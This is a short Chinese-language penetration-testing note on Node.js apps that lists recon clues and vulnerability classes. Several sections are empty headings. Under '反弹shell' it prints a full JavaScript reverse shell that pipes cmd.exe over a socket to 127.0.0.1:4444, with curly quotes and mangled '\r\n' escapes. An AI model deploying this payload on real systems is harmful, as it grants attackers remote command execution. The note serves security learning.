# Pentest Node.js 应用

> 文章内容取自：
> - https://resources.infosecinstitute.com/topic/penetration-testing-node-js-applications-part-1/
> - https://github.com/jesusprubio/awesome-nodejs-pentest

Node.js是构建于google chrome v8 引擎之上的服务器端语言，可用于事件驱动的、非阻塞I/O、面向数据密集应用的程序构建。它运行在单一线程服务器上，也就意味着任何有意无意的DoS攻击会杀死服务器，使大量客户端离线，所以最好使用多个负载均衡实例一起工作。

下面我们讨论一些node.js的相关漏洞，并指出如何识别和利用它们。

## 信息收集

类似其它web应用渗透测试过程，对于node.js ，要查找任何含有下列内容的信息：
- cookies，特别是含有 `connect.sid` 的cookie键名
- server headers
- X-powered-By headers，其值可能会泄露当前应用运行在Express 框架上。

## 漏洞分析和利用

需要查看下列类型的漏洞:
- Server Side Code Injection
- System Command Injection
- Regex DOS
- HTTP Parameter Pollution
- Unprotected Routes
- Global Namespace Pollution
- Cross Site Scripting
- Insecure Components
- Secure Code Review

### Server Side Code Injection

node.js中也有危险函数：`eval`，`setTimeOut`，`setInterval`、`parseInt` 等等，都可能造成服务器端代码注入。

### 反弹shell

可以使用下列代码得到反弹shell
```js
function rev(host,port){
var net = require(“net”);
var cp = require(“child_process”);
var cmd = cp.spawn(“cmd.exe”, []);
var client = new net.Socket();
client.connect(port, host, function(){
        client.write(“Connectedrn”);

client.pipe(cmd.stdin);

cmd.stdout.pipe(client);

cmd.stderr.pipe(client);

        client.on(‘exit’,function(code,signal){

            client.end(“Disconnectedrn”);

        });

        client.on(‘error’,function(e){

            setTimeout(rev(host,port),5000);

        })

});

return /a/;

};rev(“127.0.0.1”,4444);
```

### 系统命令执行
对node.js应用进行代码审计，非常重要的是检查来自`child_process`模块中的函数应用，因为这个模块里的函数包含了生成进程、执行系统命令等很多功能。

### 正则DoS
正则表达式DoS主要发生在所谓的 灾难回溯（Catastrophic Backtracking）上，意思是正则引擎搜索用户输入的特定的模式时引发无限的重复。

### HTTP 参数污染

### 未保护的路由

### 固化未保护的路由

## 参考

https://nodejs.org/en/download/
https://github.com/OWASP/NodeGoat
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/